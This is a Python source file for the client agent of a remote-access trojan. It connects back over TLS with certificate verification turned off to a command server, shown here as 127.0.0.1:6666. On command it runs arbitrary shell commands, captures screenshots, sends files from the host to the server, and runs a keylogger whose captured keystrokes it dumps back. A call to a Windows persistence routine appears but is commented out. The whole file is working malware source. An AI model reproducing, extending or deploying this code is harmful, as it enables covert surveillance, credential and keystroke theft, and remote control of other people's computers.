import socket
import ssl
import subprocess
import os
import platform
import shutil
import time
import threading
import struct
# import winreg
import pyautogui
from pynput.keyboard import Listener
import queue

class Agent:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.send_queue = queue.Queue()

        # --- Keylogger State Machine ---
        self.keylogger_state = 'STOPPED' # Can be 'STOPPED' or 'RUNNING'
        self.key_buffer = []
        self.key_buffer_lock = threading.Lock()
        self.keylogger_listener = None
        self.keylogger_handler_thread = None
        self.keylogger_command_queue = None

    # --- Verbose Messaging System ---
    def send_status(self, message):
        self.send_tagged_data('[STS]', message)

    def send_error(self, message):
        # Errors are now state-aware for better debugging on the server side
        self.send_tagged_data('[ERR]', f"[{self.keylogger_state}] {message}")

    def send_response(self, message):
        # All final responses now include the current state (Stateful Heartbeat)
        self.send_tagged_data('[RSP]', f"[{self.keylogger_state}] {message}")

    def send_tagged_data(self, tag, data):
        if isinstance(data, str): data = data.encode('utf-8')
        header = tag.encode('utf-8') + struct.pack('>I', len(data))
        self.send_queue.put(header + data)

    def send_file(self, filename):
        try:
            self.send_status(f"Reading file '{filename}'...")
            with open(filename, 'rb') as f:
                file_data = f.read()
            base_filename = os.path.basename(filename)
            header = b'[FIL]' + struct.pack('>I', len(base_filename)) + base_filename.encode('utf-8') + struct.pack('>Q', len(file_data))
            self.send_status(f"Sending file data ({len(file_data)} bytes)...")
            self.send_queue.put(header + file_data)
        except FileNotFoundError:
            self.send_error(f"File not found: {filename}")
        except Exception as e:
            self.send_error(f"Error preparing file: {e}")

    # --- Keylogger Core Logic ---
    def keylogger_on_press(self, key):
        key_str = ''
        try:
            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char
            elif hasattr(key, 'name'):
                key_str = f'[{key.name.upper()}]'
            else:
                key_str = '[UNKNOWN]'
        except Exception:
            key_str = '[PROC_ERR]'

        with self.key_buffer_lock:
            self.key_buffer.append(key_str)

    def key_buffer_handler(self):
        while True:
            if self.keylogger_command_queue is None:
                time.sleep(1)
                continue
            command = self.keylogger_command_queue.get()
            if command in ('DUMP', 'STOP'):
                local_key_buffer = []
                with self.key_buffer_lock:
                    if self.key_buffer:
                        local_key_buffer = self.key_buffer
                        self.key_buffer = []

                dump_message = "Keylog buffer was empty on dump request."
                if local_key_buffer:
                    log_data = "".join(local_key_buffer)
                    dump_message = f"Keylog Dump:\n{log_data}"

                if command == 'STOP':
                    # On stop, the state is already changing, so we send a final response
                    self.send_response(f"Final dump before stopping.\n{dump_message}")
                else:
                    self.send_response(dump_message)

            if command == 'STOP':
                break

    # --- Keylogger Command Handlers ---
    def start_keylogger(self):
        self.send_status("Received keylog_start command. Validating state...")
        if self.keylogger_state != 'STOPPED':
            self.send_error(f"Command 'keylog_start' failed: Keylogger is already {self.keylogger_state}.")
            return

        self.send_status("State is STOPPED. Initializing keylogger components...")
        self.key_buffer = []
        self.keylogger_command_queue = queue.Queue()

        self.send_status("Starting handler thread...")
        self.keylogger_handler_thread = threading.Thread(target=self.key_buffer_handler, daemon=True)
        self.keylogger_handler_thread.start()

        self.send_status("Starting keyboard listener...")
        self.keylogger_listener = Listener(on_press=self.keylogger_on_press)
        self.keylogger_listener.start()

        self.keylogger_state = 'RUNNING'
        self.send_status("All components started successfully.")
        self.send_response("Keylogger is now RUNNING.")

    def stop_keylogger(self):
        self.send_status("Received keylog_stop command. Validating state...")
        if self.keylogger_state != 'RUNNING':
            self.send_error(f"Command 'keylog_stop' failed: Keylogger is already {self.keylogger_state}.")
            return

        self.send_status("State is RUNNING. Proceeding with shutdown.")
        self.send_status("Stopping keyboard listener...")
        if self.keylogger_listener:
            self.keylogger_listener.stop()
            self.keylogger_listener.join()
            self.keylogger_listener = None

        self.send_status("Sending final 'STOP' command to handler for cleanup and final dump...")
        if self.keylogger_command_queue:
            self.keylogger_command_queue.put('STOP')
        self.keylogger_state = 'STOPPED'
        self.send_response("Keylogger is now STOPPED.")

    def dump_keys(self):
        # This function includes the proactive thread health check
        if self.keylogger_state == 'RUNNING':
            handler_alive = self.keylogger_handler_thread and self.keylogger_handler_thread.is_alive()
            listener_alive = self.keylogger_listener and self.keylogger_listener.is_alive()

            if not handler_alive or not listener_alive:
                self.send_error("HEALTH CHECK FAILED! A keylogger thread has died unexpectedly.")
                self.send_status("Forcing cleanup and resetting state to STOPPED.")
                if self.keylogger_listener and listener_alive:
                    self.keylogger_listener.stop()
                self.keylogger_state = 'STOPPED'
                self.send_response("Keylogger has been forcefully stopped due to thread failure.")
                return

            self.send_status("Queuing 'DUMP' command to handler.")
            if self.keylogger_command_queue:
                self.keylogger_command_queue.put('DUMP')
            else:
                self.send_error("Command queue is not initialized.")
        else:
            self.send_error(f"Command 'dump_keys' failed: Keylogger is {self.keylogger_state}.")

    def get_keylogger_status(self):
        self.send_response(f"Keylogger status is currently: {self.keylogger_state}")


    # --- Core Agent Functions (Unchanged logic, but added status reporting) ---
    def sender_thread(self):
        while True:
            data_to_send = None
            try:
                data_to_send = self.send_queue.get()
                if self.sock: self.sock.sendall(data_to_send)
                self.send_queue.task_done()
            except (AttributeError, ConnectionError, OSError):
                if data_to_send: self.send_queue.put(data_to_send)
                return

    def connect(self):
        while True:
            print("[*] Attempting to connect...")
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock = context.wrap_socket(sock, server_hostname=self.host)
                self.sock.connect((self.host, self.port))
                threading.Thread(target=self.sender_thread, daemon=True).start()
                return
            except (socket.error, ssl.SSLError):
                time.sleep(5)

    def run(self):
        # self.make_persistent_windows() # IMPORTANT: Keep this commented out during development!
        self.connect()
        while True:
            try:
                if not self.sock: self.connect(); continue

                command = self.sock.recv(1024).decode('utf-8', 'ignore').strip()
                if not command: raise ConnectionError("Server disconnected")

                try:
                    if command.lower() == 'exit': break
                    elif command.lower().startswith('cmd '):
                        self.send_status(f"Executing shell command: {command[4:]}")
                        result = subprocess.run(command[4:], shell=True, capture_output=True, text=True, errors='ignore')
                        output = result.stdout + result.stderr or "[No output]"
                        self.send_response(output)
                    elif command.lower() == 'screenshot':
                        self.send_status("Initializing screen capture...")
                        screenshot_path = 'temp_screenshot.png'
                        pyautogui.screenshot(screenshot_path)
                        self.send_status("Capture successful.")
                        self.send_file(screenshot_path)
                        os.remove(screenshot_path)
                    elif command.lower().startswith('download '):
                        self.send_file(command[9:].strip())
                    elif command.lower() == 'keylog_start': self.start_keylogger()
                    elif command.lower() == 'keylog_stop': self.stop_keylogger()
                    elif command.lower() == 'dump_keys': self.dump_keys()
                    elif command.lower() == 'keylog_status': self.get_keylogger_status()
                    else:
                        self.send_error(f"Unknown command: '{command}'")
                except Exception as e:
                    self.send_error(f"Client execution error: {type(e).__name__}: {e}")

            except (ConnectionError, ssl.SSLError, ConnectionResetError, BrokenPipeError):
                if self.sock: self.sock.close(); self.sock = None
                time.sleep(1)
                self.connect()

if __name__ == '__main__':
    SERVER_HOST = '127.0.0.1'
    SERVER_PORT = 6666
    agent = Agent(SERVER_HOST, SERVER_PORT)
    agent.run()